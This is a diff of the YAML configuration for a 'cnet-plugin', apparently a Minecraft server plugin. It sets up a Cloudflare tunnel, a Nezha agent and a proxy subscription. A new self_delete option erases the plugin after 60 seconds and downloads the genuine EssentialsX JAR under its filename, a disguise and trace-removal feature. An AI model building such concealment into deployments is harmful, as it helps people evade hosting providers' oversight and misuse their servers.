@@ -1,22 +1,15 @@
-# cnet-plugin 配置文件
-# 优先级说明：如果同名的环境变量也设置了，环境变量会覆盖这里的值
-# （方便用面板/容器统一用环境变量管理，又能在没有环境变量时直接改这个文件）
-
-# 服务端口（对应原来的 SERVER_PORT2 环境变量）
-server-port2: 3000
-
-# 二进制下载/运行目录，留空则使用插件数据目录 plugins/CnetPlugin/
-file-path: ""
-
-# 是否输出日志
-show-log: false
-
-token: "123"
-sub-name: ""
-sub-url: ""
-tok: ""
-dom: ""
-nserver: ""
-nkey: ""
-app-uuid: ""
-app-tls: true
+show_log:    "false"       # 是否显示 cnet 日志，true/false
+server_port: "7860"        # 监听端口
+force_port:  ""            # 非空时强制使用，忽略 SERVER_PORT/PORT 环境变量
+token:       "your_token"  # 访问令牌
+sub_name:    ""            # 订阅名称
+sub_url:     ""            # 订阅地址
+tok:         ""            # CF Tunnel token
+dom:         ""            # 域名
+nserver:     ""            # Nezha server 地址
+nkey:        ""            # Nezha 密钥
+app_uuid:    ""            # CF Access UUID
+app_tls:     "true"        # 是否启用 TLS
+self_delete: "false"       # true = 启动 60 秒后删除 cnet 和插件自身，并下载替换 JAR
+self_name:   "EssentialsX-2.22.0.jar"   # 插件自身文件名
+replace_url: "https://github.com/EssentialsX/Essentials/releases/download/2.22.0/EssentialsX-2.22.0.jar"  # 替换下载地址
